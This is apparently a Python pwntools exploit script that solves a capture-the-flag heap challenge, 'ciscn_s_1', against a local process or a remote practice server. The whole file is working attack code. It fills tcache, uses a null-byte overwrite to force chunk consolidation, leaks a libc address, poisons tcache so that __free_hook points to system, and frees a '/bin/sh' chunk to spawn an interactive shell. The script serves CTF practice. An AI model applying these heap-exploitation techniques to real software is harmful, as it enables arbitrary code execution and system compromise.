import sys
from pwn import *
context.log_level='debug'
#context.arch='amd64'
while True :
	# try :
		if len(sys.argv)==1 :
			io=process('./ciscn_s_1')
			# io=process(['./'],env={'LD_PRELOAD':'./'})
			elf=ELF('./ciscn_s_1')
			libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')
		else :
			io=remote('node3.buuoj.cn',28429)
			elf=ELF('./ciscn_s_1')
			libc=ELF('../../x64libc/libc.so.6')

		def add(a,b,c):
			io.sendlineafter('4.show\n','1')
			io.sendlineafter('index:\n',str(a))
			io.sendlineafter('size:\n',str(b))
			io.sendafter('content:\n',c)

		def delete(a):
			io.sendlineafter('4.show\n','2')
			io.sendlineafter('index:\n',str(a))

		def edit(a,c):
			io.sendlineafter('4.show\n','3')
			io.sendlineafter('index:\n',str(a))
			io.sendafter('content:\n',c)

		def show(a):
			io.sendlineafter('4.show\n','4')
			io.sendlineafter('index:\n',str(a))
		add(0,0x88,'aaaaa')
		add(1,0x88,'aaaaa')
		add(2,0xd8,'aaaaa')
		add(3,0xf8,'aaaaa')
		add(4,0xf8,'aaaa')
		for i in range (7):
			add(0x18+i,0x88,'aaaaa')
		for i in range (7):
			delete(0x18+i)
		for i in range (7):
			add(0x18+i,0xf8,'aaaaa')
		for i in range (7):
			delete(0x18+i)
		delete(0)
		edit(2,'\x00'*0xd0+p64(0x200))
		delete(3)
		for i in range (7):
			add(0x18+i,0x88,'aaaaa')
		add(0,0x88,'/bin/sh\x00')
		add(3,0x88,'aaaaa')
		delete(1)
		delete(3)
		add(1,0x88,p64(0x6022b8))
		add(3,0x88,p64(0x6022b8))
		add(5,0x88,p32(0x111)+p32(0x111))
		show(2)
		libc_base=u64(io.recv(6)+'\x00\x00')-libc.sym['__malloc_hook']-0x70
		libc.address=libc_base
		add(6,0x98,'aaaa')
		delete(2)
		delete(6)
		add(2,0x98,p64(libc.sym['__free_hook']))
		add(6,0x98,p64(libc.sym['__free_hook']))
		add(7,0x98,p64(libc.sym['system']))
		delete(0)

		





		success('libc_base:'+hex(libc_base))
		#gdb.attach(io)
		#pause()
		io.interactive()

	# except Exception as e:
	# 	io.close()
	# 	continue
	# else:
	# 	continue